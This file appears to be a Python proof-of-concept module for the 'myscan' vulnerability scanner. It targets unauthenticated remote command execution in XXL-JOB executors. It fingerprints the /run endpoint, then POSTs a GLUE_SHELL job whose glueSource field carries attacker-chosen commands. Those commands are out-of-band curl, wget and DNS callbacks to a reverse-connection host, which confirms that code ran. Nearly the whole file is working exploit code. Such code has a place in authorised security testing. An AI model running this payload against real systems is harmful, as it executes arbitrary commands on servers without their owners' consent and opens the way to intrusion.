# !/usr/bin/env python3
# @Time    : 2020/11/26
# @Author  : caicai
# @File    : poc_xxl-job_unauth_rce_2020.py


from myscan.lib.core.common_reverse import generate_reverse_payloads, query_reverse, generate
from myscan.lib.helper.request import request  # 修改了requests.request请求的库，建议使用此库，会在redis计数
from myscan.lib.parse.dictdata_parser import dictdata_parser
from myscan.lib.core.threads import mythread


class POC():
    def __init__(self, workdata):
        self.dictdata = workdata.get("dictdata")  # python的dict数据，详情请看docs/开发指南Example dict数据示例
        self.url = workdata.get("data")  # self.url为需要测试的url，值为目录url，会以/结尾,如https://www.baidu.com/home/ ,为目录
        self.result = []  # 此result保存dict数据，dict需包含name,url,level,detail字段，detail字段值必须为dict。如下self.result.append代码
        self.name = "xxl-job_unauth_rce"
        self.vulmsg = "detail:https://github.com/vulhub/vulhub/tree/master/xxl-job/unacc"
        self.level = 3  # 0:Low  1:Medium 2:High
        self.success = False

    def verify(self):
        # 限定一下目录深度,涉及反连，谨慎点
        if self.url.count("/") != 3:
            return

        # 验证是否是xxl-job
        req = {
            "method": "POST",
            "url": self.url + "run",
            "headers": {
                "Content-Type": "application/json"
            },
            "allow_redirects": False,
            "verify": False,
            "timeout": 10
        }
        r = request(**req)
        if r is not None and b"com.xxl.job.core.server" in r.content:
            reverse_urls, hexdata_url = generate_reverse_payloads(self.name)
            reverse_dnscmd, hexdata_dns = generate_reverse_payloads(self.name, "dns")

            # reverse_urls_ = filter(lambda x: x.startswith("curl") or x.startswith("wget"), reverse_urls)

            tasks = reverse_dnscmd + reverse_urls
            mythread(self.run, tasks)

            sleep = True
            for hexdata in [hexdata_url, hexdata_dns]:
                query_res, _ = query_reverse(hexdata, sleep)
                sleep = False
                if query_res:
                    parser_ = dictdata_parser(self.dictdata)
                    self.result.append({
                        "name": self.name,
                        "url": self.url,
                        "level": self.level,  # 0:Low  1:Medium 2:High
                        "detail": {
                            "vulmsg": self.vulmsg,
                            "others:": "{} in dnslog".format(hexdata),
                            "request": parser_.getrequestraw(),
                            "response": parser_.getresponseraw()
                        }
                    })
                    break

    def run(self, cmd):
        data = '''{
  "jobId": 1,
  "executorHandler": "demoJobHandler",
  "executorParams": "demoJobHandler",
  "executorBlockStrategy": "COVER_EARLY",
  "executorTimeout": 0,
  "logId": 1,
  "logDateTime": 1586629003729,
  "glueType": "GLUE_SHELL",
  "glueSource": "%s",
  "glueUpdatetime": 1586699003758,
  "broadcastIndex": 0,
  "broadcastTotal": 0
}''' % cmd
        req = {
            "method": "POST",
            "url": self.url + "run",
            "headers": {
                "Content-Type": "application/json"
            },
            "data": data,
            "allow_redirects": False,
            "verify": False,
            "timeout": 10
        }
        r = request(**req)
